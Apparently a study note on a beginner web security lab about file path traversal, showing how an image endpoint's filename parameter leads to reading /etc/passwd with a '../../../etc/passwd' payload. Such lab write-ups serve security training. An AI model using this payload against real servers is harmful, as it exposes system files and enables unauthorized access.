---
title: File path traversal, simple case
category: Path traversal
difficulty: Apprentice
tags:
  - broken-access-control
  - path-traversal
---
This is a simple lab. The goal is to read `/etc/passwd` using a path traversal vulnerability.

A quick check of the HTML source reveals that images are loaded using a GET parameter, which shows that the endpoint might be vulnerable to path traversal: 
```html
<img src="/image?filename=61.jpg">
```

Therefore, we can test this with a payload like `GET /image?filename=../../../etc/passwd HTTP/2`:
![[file-path-traversal-simple-case-img1.png]]
